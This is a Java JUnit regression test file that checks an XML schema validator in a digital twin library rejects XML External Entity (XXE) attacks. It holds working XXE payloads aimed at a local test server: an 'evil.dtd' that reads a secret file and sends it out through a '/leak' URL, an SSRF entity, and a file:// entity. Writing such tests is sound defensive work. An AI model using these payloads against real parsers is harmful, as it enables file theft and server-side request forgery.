/*
 * Copyright (c) 2021 Fraunhofer-Gesellschaft zur Foerderung der angewandten Forschung e. V.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.eclipse.digitaltwin.aas4j.v3.dataformat.xml;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;

import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.Set;
import java.util.concurrent.CopyOnWriteArrayList;

import org.junit.After;
import org.junit.Before;
import org.junit.Test;

import com.sun.net.httpserver.HttpServer;

/**
 * Regression tests for XML External Entity (XXE) handling in {@link XmlSchemaValidator} (CWE-611).
 * The validator must never resolve external DTDs or entities and must reject documents containing a
 * DOCTYPE declaration.
 */
public class XmlSchemaValidatorXxeTest {

  private HttpServer server;
  private final List<String> requests = new CopyOnWriteArrayList<>();
  private Path secret;

  @Before
  public void startServer() throws Exception {
    secret = Files.createTempFile("xxe-secret", ".txt");
    Files.write(secret, "SECRET-CONTENT".getBytes(StandardCharsets.UTF_8));

    server = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
    server.createContext(
        "/",
        exchange -> {
          requests.add(exchange.getRequestURI().toString());
          String dtd = "";
          if ("/evil.dtd".equals(exchange.getRequestURI().getPath())) {
            dtd =
                "<!ENTITY % p1 SYSTEM \"file://"
                    + secret.toAbsolutePath()
                    + "\">\n"
                    + "<!ENTITY % p2 \"<!ENTITY exfil SYSTEM 'http://127.0.0.1:"
                    + server.getAddress().getPort()
                    + "/leak?%p1;'>\">\n%p2;\n";
          }
          byte[] body = dtd.getBytes(StandardCharsets.UTF_8);
          exchange.sendResponseHeaders(200, body.length);
          exchange.getResponseBody().write(body);
          exchange.getResponseBody().close();
        });
    server.start();
  }

  @After
  public void stopServer() throws Exception {
    server.stop(0);
    Files.deleteIfExists(secret);
  }

  @Test
  public void externalDtdIsNotFetched() throws Exception {
    int port = server.getAddress().getPort();
    String xml =
        "<?xml version=\"1.0\"?>\n"
            + "<!DOCTYPE foo [<!ENTITY % ext SYSTEM \"http://127.0.0.1:"
            + port
            + "/evil.dtd\"> %ext;]>\n"
            + "<aas:environment xmlns:aas=\"https://admin-shell.io/aas/3/1\">&exfil;</aas:environment>\n";

    Set<String> errors = new XmlSchemaValidator().validateSchema(xml);

    assertFalse("Document with DOCTYPE must be rejected", errors.isEmpty());
    assertEquals("No outbound request may be made: " + requests, 0, requests.size());
  }

  @Test
  public void externalGeneralEntityIsNotResolved() throws Exception {
    int port = server.getAddress().getPort();
    String xml =
        "<?xml version=\"1.0\"?>\n"
            + "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:"
            + port
            + "/ssrf\">]>\n"
            + "<aas:environment xmlns:aas=\"https://admin-shell.io/aas/3/1\">&xxe;</aas:environment>\n";

    Set<String> errors = new XmlSchemaValidator().validateSchema(xml);

    assertFalse("Document with DOCTYPE must be rejected", errors.isEmpty());
    assertEquals("No outbound request may be made: " + requests, 0, requests.size());
  }

  @Test
  public void localFileEntityIsNotResolved() throws Exception {
    String xml =
        "<?xml version=\"1.0\"?>\n"
            + "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file://"
            + secret.toAbsolutePath()
            + "\">]>\n"
            + "<aas:environment xmlns:aas=\"https://admin-shell.io/aas/3/1\">&xxe;</aas:environment>\n";

    Set<String> errors = new XmlSchemaValidator().validateSchema(xml);

    assertFalse("Document with DOCTYPE must be rejected", errors.isEmpty());
    for (String error : errors) {
      assertFalse("File content must not leak into errors", error.contains("SECRET-CONTENT"));
    }
  }

  @Test
  public void documentWithoutDoctypeStillValidates() throws Exception {
    String xml =
        new String(
            Files.readAllBytes(java.nio.file.Paths.get("src/test/resources/minimum.xml")),
            StandardCharsets.UTF_8);

    assertEquals(0, new XmlSchemaValidator().validateSchema(xml).size());
  }
}
